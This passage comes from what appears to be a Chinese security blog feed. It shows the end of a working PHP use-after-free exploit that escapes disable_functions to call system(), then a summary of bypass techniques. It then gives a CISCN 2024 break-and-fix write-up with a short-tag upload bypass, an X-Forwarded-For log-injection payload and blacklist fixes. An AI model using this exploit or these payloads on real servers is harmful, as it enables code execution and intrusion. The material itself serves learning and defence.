invoke__">dechex</span>(<span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$nameAddr</span>));<br>        <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_pad</span>(<span class="hljs-variable">$name</span>, <span class="hljs-number">16</span>, <span class="hljs-string">&quot;0&quot;</span>, STR_PAD_LEFT);<br>        <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$name</span>));<br>        <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;\x00&quot;</span>, <span class="hljs-variable">$name</span>)[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$name</span> === <span class="hljs-string">&quot;system&quot;</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$addr</span> + <span class="hljs-number">0x08</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Trigger</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$s</span>;<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$s</span>[<span class="hljs-number">0</span>]);<br>        <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-number">0xf</span>));<br>        <span class="hljs-title function_ invoke__">i2s</span>(<span class="hljs-variable">$a</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x1234567812345678</span>);<br>        <span class="hljs-title function_ invoke__">i2s</span>(<span class="hljs-variable">$a</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">7</span>);<br>        <span class="hljs-variable">$s</span> -&gt; <span class="hljs-title function_ invoke__">current</span>();<br>        <span class="hljs-variable">$s</span> -&gt; <span class="hljs-title function_ invoke__">next</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$s</span> -&gt; <span class="hljs-title function_ invoke__">current</span>() !== <span class="hljs-number">0x1234567812345678</span>) &#123;<br>             <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;[!]UAF Failed&quot;</span>);<br>        &#125;<br>        <span class="hljs-variable">$maps</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/proc/self/maps&quot;</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$maps</span>) &#123;<br>            <span class="hljs-title function_ invoke__">cantRead</span>(<span class="hljs-variable">$a</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-title function_ invoke__">canRead</span>(<span class="hljs-variable">$maps</span>, <span class="hljs-variable">$a</span>);<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[+]Done&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bypass</span>(<span class="hljs-params"><span class="hljs-variable">$elementAddress</span>, &amp;<span class="hljs-variable">$a</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$s</span>;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$closureChunkAddress</span> = <span class="hljs-title function_ invoke__">getClosureChunk</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$elementAddress</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;[!]Get Closure Chunk Address Failed&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$closure_object</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$closureChunkAddress</span> + <span class="hljs-number">0x18</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[+]Closure Object: &quot;</span> . <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$closure_object</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br>    <span class="hljs-variable">$closure_handlers</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$closure_object</span> + <span class="hljs-number">0x18</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[+]Closure Handler: &quot;</span> . <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$closure_handlers</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$system_address</span> = <span class="hljs-title function_ invoke__">getSystem</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$closure_handlers</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;[!]Couldn&#x27;t determine system address&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[+]Find system&#x27;s handler: &quot;</span> . <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$system_address</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br>    <span class="hljs-title function_ invoke__">i2s</span>(<span class="hljs-variable">$a</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x506</span>, <span class="hljs-number">7</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$i</span> &lt; (<span class="hljs-number">0x130</span> / <span class="hljs-number">0x08</span>);<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$closure_object</span> + <span class="hljs-number">0x08</span> * <span class="hljs-variable">$i</span>);<br>        <span class="hljs-title function_ invoke__">i2s</span>(<span class="hljs-variable">$a</span>, <span class="hljs-number">0x00</span>, <span class="hljs-variable">$closure_object</span> + <span class="hljs-number">0x30</span>);<br>        <span class="hljs-title function_ invoke__">i2s</span>(<span class="hljs-variable">$s</span> -&gt; <span class="hljs-title function_ invoke__">current</span>(), <span class="hljs-number">0x08</span> * <span class="hljs-variable">$i</span> + <span class="hljs-number">0x100</span>, <span class="hljs-variable">$data</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">i2s</span>(<span class="hljs-variable">$a</span>, <span class="hljs-number">0x00</span>, <span class="hljs-variable">$closure_object</span> + <span class="hljs-number">0x30</span>);<br>    <span class="hljs-title function_ invoke__">i2s</span>(<span class="hljs-variable">$s</span> -&gt; <span class="hljs-title function_ invoke__">current</span>(), <span class="hljs-number">0x20</span>, <span class="hljs-variable">$system_address</span>);<br>    <span class="hljs-title function_ invoke__">i2s</span>(<span class="hljs-variable">$a</span>, <span class="hljs-number">0x00</span>, <span class="hljs-variable">$closure_object</span>);<br>    <span class="hljs-title function_ invoke__">i2s</span>(<span class="hljs-variable">$a</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x108</span>, <span class="hljs-number">7</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[+]Executing command: \n&quot;</span>;<br>    (<span class="hljs-variable">$s</span> -&gt; <span class="hljs-title function_ invoke__">current</span>())(<span class="hljs-string">&quot;php -v&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">canRead</span>(<span class="hljs-params"><span class="hljs-variable">$maps</span>, &amp;<span class="hljs-variable">$a</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$s</span>;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$chunkAddress</span> = <span class="hljs-title function_ invoke__">getPHPChunk</span>(<span class="hljs-variable">$maps</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;[!]Get PHP Chunk Address Failed&quot;</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">i2s</span>(<span class="hljs-variable">$a</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">7</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$elementAddress</span> = <span class="hljs-title function_ invoke__">getElement</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$chunkAddress</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;[!]Get SplDoublyLinkedList Element Address Failed&quot;</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">bypass</span>(<span class="hljs-variable">$elementAddress</span>, <span class="hljs-variable">$a</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cantRead</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$a</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$s</span>;<br>    <span class="hljs-title function_ invoke__">i2s</span>(<span class="hljs-variable">$a</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">7</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;test1&quot;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;test2&quot;</span>])) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;[!]Please try to get address of PHP Chunk&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;test1&quot;</span>])) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-title function_ invoke__">bomb1</span>(<span class="hljs-variable">$a</span>)));<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;test2&quot;</span>])) &#123;<br>        <span class="hljs-variable">$elementAddress</span> = <span class="hljs-title function_ invoke__">bomb2</span>(<span class="hljs-variable">$a</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$elementAddress</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;[!]Get SplDoublyLinkedList Element Address Failed&quot;</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">bypass</span>(<span class="hljs-variable">$elementAddress</span>, <span class="hljs-variable">$a</span>);<br>&#125;<br><br><span class="hljs-variable">$s</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplDoublyLinkedList</span>();<br><span class="hljs-variable">$s</span> -&gt; <span class="hljs-title function_ invoke__">push</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Trigger</span>());<br><span class="hljs-variable">$s</span> -&gt; <span class="hljs-title function_ invoke__">push</span>(<span class="hljs-string">&quot;Twings&quot;</span>);<br><span class="hljs-variable">$s</span> -&gt; <span class="hljs-title function_ invoke__">push</span>(function(<span class="hljs-variable">$x</span>)&#123;&#125;);<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$x</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$x</span> &lt; <span class="hljs-number">0x100</span>;<span class="hljs-variable">$x</span>++) &#123;<br>    <span class="hljs-variable">$s</span> -&gt; <span class="hljs-title function_ invoke__">push</span>(<span class="hljs-number">0x1234567812345678</span>);<br>&#125;<br><span class="hljs-variable">$s</span> -&gt; <span class="hljs-title function_ invoke__">rewind</span>();<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$s</span>[<span class="hljs-number">0</span>]);<br></code></pre></td></tr></table></figure><p>包含该php即可执行命令(141行)</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote><p>大部分绕过方法在蚁剑中都有插件可以自动利用</p></blockquote><p>绕过disable_functions的方法大致可以分为以下几类</p><p>1：寻找未禁用的函数</p><p>2：攻击后端组件：Apache_mod_cgi；ImageMagick；Bash Shellshock；</p><p>3：利用php的扩展：制作恶意php扩展；php74_FFI；windows com；imap_open()；</p><p>4：利用环境变量或者so文件：LD_PRELOAD；php-fpm；iconv；</p><p>5：pwn：写shellcode劫持got表；php7_GC_UAF；JSON_Serializer_UAF；php7_Backtrace_UAF；php_Concat_UAF；php7_UserFilter；php7_ReflectionProperty_UAF；php7_SplDoublyLinkedList UAF；</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;常规函数函数绕过&quot;&gt;&lt;a href=&quot;#常规函数函数绕过&quot; class=&quot;headerlink&quot; title=&quot;常规函数函数绕过&quot;&gt;&lt;/a&gt;常规函数函数绕过&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td clas</summary>
      
    
    
    
    <category term="总结" scheme="https://www.dr0n.top/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="总结" scheme="https://www.dr0n.top/tags/%E6%80%BB%E7%BB%93/"/>
    
    <category term="php" scheme="https://www.dr0n.top/tags/php/"/>
    
    <category term="bypass" scheme="https://www.dr0n.top/tags/bypass/"/>
    
    <category term="disable_functions" scheme="https://www.dr0n.top/tags/disable-functions/"/>
    
    <category term="pwn" scheme="https://www.dr0n.top/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>第十七届全国大学生信息安全竞赛-华东南分区赛</title>
    <link href="https://www.dr0n.top/posts/deeac2cd/"/>
    <id>https://www.dr0n.top/posts/deeac2cd/</id>
    <published>2024-06-25T04:30:00.000Z</published>
    <updated>2025-07-27T10:03:39.814Z</updated>
    
    <content type="html"><![CDATA[<p>1签到+4web+4pwn</p><h1 id="web-welcome"><a href="#web-welcome" class="headerlink" title="web-welcome"></a>web-welcome</h1><p>签到，Ctrl+U</p><p><img src="/img/wp/2024/2024ciscn-welcome_1.png"></p><h1 id="web-submit"><a href="#web-submit" class="headerlink" title="web-submit"></a>web-submit</h1><h2 id="break"><a href="#break" class="headerlink" title="break"></a>break</h2><p>文件上传，有对内容检测，使用短标签绕过</p><p><img src="/img/wp/2024/2024ciscn-submit-BREAK_1.png"></p><p><img src="/img/wp/2024/2024ciscn-submit-BREAK_2.png"></p><h2 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h2><p>添加黑名单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// $path = &quot;./uploads&quot;;</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;./uploads&quot;</span>;<br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;myfile&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br><span class="hljs-variable">$allow_content_type</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;image/png&quot;</span>);<br><span class="hljs-variable">$type</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;myfile&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$type</span>, <span class="hljs-variable">$allow_content_type</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;只允许png哦!&lt;br&gt;&quot;</span>);<br>&#125;<br><br><br><span class="hljs-comment">// 修改点</span><br><span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.php1&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.pHp1&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br><span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;myfile&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br><br><span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br><span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>);<br><span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<br><span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;此文件不允许上传!&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(php|script|xml|user|htaccess)/i&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>    <span class="hljs-comment">// echo &quot;匹配成功!&quot;;</span><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;鼠鼠说你的内容不符合哦0-0&#x27;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$path</span> . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;myfile&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;myfile&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$file</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Success!&lt;br&gt;&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Error!&lt;br&gt;&#x27;</span>;<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><br>&lt;!----&gt;<br><br></code></pre></td></tr></table></figure><h1 id="web-粗心的程序员"><a href="#web-粗心的程序员" class="headerlink" title="web-粗心的程序员"></a>web-粗心的程序员</h1><h2 id="break-1"><a href="#break-1" class="headerlink" title="break"></a>break</h2><p>扫目录，得到<code>www.zip</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;default_info_auto_recovery.php&quot;</span>;<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$p</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>]?:<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\?|php|:/i&quot;</span>,<span class="hljs-variable">$p</span>))<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br><span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Y-m-d h:i:s&#x27;</span>, <span class="hljs-title function_ invoke__">time</span>());<br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$username</span> &amp;&amp; <span class="hljs-variable">$id</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello,&quot;</span>.<span class="hljs-string">&quot;<span class="hljs-subst">$username</span>&quot;</span>;<br>    <span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;//登陆时间<span class="hljs-subst">$time</span>,<span class="hljs-subst">$username</span> <span class="hljs-subst">$p</span>&quot;</span>;<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str</span>);<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;config.php&quot;</span>,<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;config.php&quot;</span>).<span class="hljs-variable">$str</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NO ACCESS&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>home.php中会写入登录日志<code>$str = &quot;//登陆时间$time,$username $p&quot;;</code></p><p>用<code>?&gt;&lt;? phpinfo(); //</code>截断注释输出phphinfo</p><p><img src="/img/wp/2024/2024ciscn-%E7%B2%97%E5%BF%83%E7%9A%84%E7%A8%8B%E5%BA%8F%E5%91%98-BREAK_1.png"></p><p>或者写入一个换行后在xff中执行命令</p><h2 id="fix-1"><a href="#fix-1" class="headerlink" title="fix"></a>fix</h2><p>对于写入日志的两个参数添加黑名单</p><p>home.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;default_info_auto_recovery.php&quot;</span>;<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$p</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>]?:<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>];<br><br><span class="hljs-comment">// 修改点1</span><br><span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;//&quot;</span>,<span class="hljs-string">&quot;#&quot;</span>,<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;=&quot;</span>];<br><span class="hljs-variable">$p</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$blacklist</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$p</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\?|php|\&gt;|:/i&quot;</span>,<span class="hljs-variable">$p</span>))<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br><span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Y-m-d h:i:s&#x27;</span>, <span class="hljs-title function_ invoke__">time</span>());<br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$username</span> &amp;&amp; <span class="hljs-variable">$id</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello,&quot;</span>.<span class="hljs-string">&quot;<span class="hljs-subst">$username</span>&quot;</span>;<br><br>    <span class="hljs-comment">// 修改点2</span><br>    <span 